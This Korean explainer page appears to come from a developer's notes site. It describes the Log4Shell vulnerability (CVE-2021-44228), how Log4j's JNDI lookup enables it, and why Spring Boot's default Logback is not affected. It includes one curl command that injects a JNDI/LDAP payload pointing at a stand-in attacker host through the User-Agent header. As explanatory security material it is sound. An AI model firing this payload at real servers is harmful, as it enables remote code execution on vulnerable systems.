---
layout: default
title: Log4j
parent: 자바 라이브러리 Java libary
nav_order: 200
last_modified_date: 2021-02-18 00:00:00
last_modified_at: 2021-02-18 00:00:00
---

# Log4j


## Log4j 보안 취약점 사태

[CVE-2021-44228](https://ko.wikipedia.org/wiki/Log4Shell)

Java 언어 기반의 프로그램중 가장 많이 사용하는 로그 라이브러리로써, 2.14.1 이하 버전의 log4j2 를 사용할 경우 이 취약점에 노출된다.

최초의 발단은 알리바바 클라우드 보안팀으로 부터 알려지게 되었으며, 2021년 12월 9일 트위터의 [게시글](https://twitter.com/P0rZ9/status/1468949890571337731) 로 부터 본격적으로 대중들에게 알려지게 되었다. 

## 취약점 원리

취약점 원리를 먼저 파악하기 전 JNDI(Java Naming and Directory Interface)에 대해 먼저 이해하여야 한다. JNDI는 디렉터리 서비스에서 제공하는 데이터 및 객체를 발견(discover)하고 참고(lookup)하기 위한 자바 API다.

많이 쓰이는 API는 아니지만 그나마 일반적으로 쓰였던 것은 원격에서 Java 애플리케이션 DB 설정을 변경하고자 할 때 사용하기도 한다. JDNI의 경우 LDAP, DNS, NIS, RMI 같은 프로토콜을 이용해서 JNDI를 호출할 수 있도록 지원한다.

JNDI 자체가 문제가 되는건 아니다. 근데 log4j 에서 무슨 이유인지는 모르겠지만 log 를 찍을때, JNDI 를 lookup 할 수 있는 코드가 포함되어 있었다. Log4j 라이브러리  패키지 경로 <code> package org.apache.logging.log4j.core.lookup </code> 에서 <code> JndiLookup </code> 이라는 클래스 가 있는데, 이 녀석은 logger 인터페이스로 전달받은 내용중 특정 네이밍 규칙으로 입력된 내용을 JDNI 으로 핸들링 해주는 클래스이다.  자세한 코드는 우측 링크를 선택해서 보면 된다. [JndiLookup.java](https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java)

여기에 LDAP 이라는 프로토콜과 결합되어 심각한 문제가 발생됬다. User-Agent 나 X-Api-Version 같은 header 값을 로그로 출력하는 코드가 포함되어 있을 경우 해커의 LDAP 주소를 입력하여 악성 코드를 서버에서 손쉽게 실행할 수 있게 된 것이다.

```
curl 127.0.0.1:8080 -H 'User-Agent: ${jndi:ldap://attacker.com/a}'
```

즉 이번 사태의 **근본적인 문제**는 log4j 에서 log 를 출력할 때, JNDI 를 lookup 하고 있었다는것이 문제다. 왜냐하면 log 를 출력할때 JNDI 를 lookup 하는 기능은 아무도 쓰지도 않는 기능이다. 스프링 부트 기본 내장 logger 인 logback 에서는 jndi lookup 자체를 하고 있지 않다. 굳이 고급 개발자가 아니더라도 해당 코드는 취약점이 발생하기 매우 높은 코드라는것은 예측이 가능한데 왜 이런 코드가 오픈 소스에 포함이 되어 있었을까 의문이다. (혹시?)

## Spring boot Logback은 안전하다.

위 취약점은 log4j에서 발생했다. 스프링 부트는 기본적으로 logback 을 사용한다. logback 은 jndi 자체를 lookup 하지 않기 때문에 ${jndi:~~} 와 같은 코드를 보내더라도 단순 문자열으로 출력할 뿐이다. 물론 스프링 부트 기본 logger를 사용하지 않고 직접 log4j 의존성을 주입하여 사용했다면 문제가 될 수 있다.